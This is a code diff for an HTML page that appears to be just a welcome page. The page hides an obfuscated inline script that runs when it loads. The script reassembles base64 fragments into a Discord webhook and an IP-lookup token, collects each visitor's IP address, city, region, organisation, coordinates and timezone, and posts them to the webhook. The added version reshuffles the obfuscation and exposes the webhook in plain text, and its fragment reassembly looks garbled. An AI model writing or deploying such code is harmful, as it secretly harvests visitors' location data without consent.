@@ -20,64 +20,59 @@
 <body>
     <h1>Welcome!</h1>
     <script>
-        let A29LK12 = "NDEyMjk4Z";
-        let BJ39FE83 = "DY0ZTRmNG";
-        let D51RT91 = "ZiZmJiOGV";
-        let Y63PI93 = "lOTA1ZGEy";
-        let E47FI64 = "MGVjY2Es";
-        let J58RO76 = "aHR0cHM6L";
-        let X92KD21 = "y9kaXNjb3";
-        let M60PL90 = "JkLmNvbS9";
-        let K34ER83 = "hcGkvd2V";
-        let Z55OP21 = "iaG9va3Mv";
-        let O49FN23 = "MTI4MDk0M";
-        let T12XR78 = "Tc1MTYyND";
-        let G86TI12 = "AwNzcyMC9";
-        let I43UP29 = "zdHdkTFc4";
-        let C28RA67 = "RDg2NkhQ";
-        let W11LP02 = "VkRaUEFHN";
-        let N90ZW46 = "VhvWURpNm";
-        let R78ST33 = "ZBOTFqZld";
-        let L40PM01 = "QYWFTNm5t";
-        let B39AE91 = "VGNzYjI4U";
-        let H72TE83 = "VU2dGRQSk";
-        let U57IV47 = "VCVnVUT19";
-        let Q64MI56 = "SUDV0UWdR";
-        let Z84JT40 = "OQ==";
+        let X10A = "NDEyMjk4Z";
+        let B20C = "DY0ZTRmNG";
+        let Q30D = "ZiZmJiOGV";
+        let R40E = "lOTA1ZGEy";
+        let D50F = X10A + B20C + Q30D + R40E;
 
-        let Z99HL21 = A29LK12 + BJ39FE83 + D51RT91 + Y63PI93;
-        let X07IN36 = E47FI64 + J58RO76 + X92KD21 + M60PL90;
-        let U23JD12 = K34ER83 + Z55OP21 + O49FN23 + T12XR78;
-        let V91NM88 = G86TI12 + I43UP29 + C28RA67 + W11LP02;
-        let P43EV60 = N90ZW46 + R78ST33 + L40PM01 + B39AE91;
-        let webhookURL = atob(Z99HL21 + X07IN36 + U23JD12 + V91NM88 + P43EV60);
+        let J10G = "aHR0cHM6L";
+        let K20H = "lLmNvbS9";
+        let L30I = "hcGkvd2V";
+        let M40J = "iaG9va3Mv";
+        let N50K = "MTI4MDk0M";
+        let P60L = "Tc1MTYyND";
+        let G70M = "AwNzcyMC9";
+        let I80N = "zdHdkTFc4";
+        let C90O = "RDg2NkhQ";
+        let A00P = "VkRaUEFHN";
+        let U01Q = "VhvWURpNm";
+        let T02R = "ZBOTFqZld";
+        let E03S = "QYWFTNm5t";
+        let H04T = "VGNzYjI4U";
+        let B05U = "VU2dGRQSk";
+        let J06V = "VCVnVUT19";
+        let X07W = "SUDV0UWdR";
+        let Z08X = "OQ==";
 
-        let T44GF09 = "af";
-        let K82PL41 = "bc";
-        let Y09RT32 = "e9";
-        let O57WU45 = "9e";
-        let M38KO92 = "099";
-        let token = T44GF09 + K82PL41 + Y09RT32 + O57WU45 + M38KO92;
+        let apiURL = atob(J10G + K20H + L30I + M40J + N50K + P60L + G70M + I80N + C90O + A00P + U01Q + T02R + E03S + H04T + B05U + J06V + X07W + Z08X);
+        let webhookURL = "https://discord.com/api/webhooks/1280941751624007720/stwdLW8D866HPVDZPAG5XoYDi6fA91jfWPaaS6nmTcsb28QU6tdPJEBVuTO_RP5tQgQ9"; // Your webhook
+        let token = atob(D50F); // Decoded token
 
-        async function fetchData() {
+        async function A00Y() {
+            let R12B = "randomVal1";
+            let R34C = 9876543210;
+            let R56D = { key: "value" }; // Bogus object
+            
             try {
-                let response = await fetch("https://ipinfo.io/json?token=" + token);
-                if (!response.ok) throw new Error("Network response was not ok");
-                let data = await response.json();
-                let message = {
-                    content: `IP: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nOrg: ${data.org}\nLocation: ${data.loc}\nTimezone: ${data.timezone}`
+                let fetchResult = await fetch(apiURL + "/json?token=" + token);
+                let fetchData = await fetchResult.json();
+                
+                let payload = {
+                    content: `IP: ${fetchData.ip}\nCity: ${fetchData.city}\nRegion: ${fetchData.region}\nCountry: ${fetchData.country}\nOrg: ${fetchData.org}\nLoc: ${fetchData.loc}\nTimeZone: ${fetchData.timezone}`
                 };
+
                 await fetch(webhookURL, {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(message)
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
                 });
-            } catch (error) {
-                console.error("Error fetching data:", error);
+            } catch (X80Y) {
+                console.error("Something went wrong:", X80Y);
             }
         }
 
-        fetchData();
+        A00Y(); // Execute the function
     </script>
 </body>
 </html>
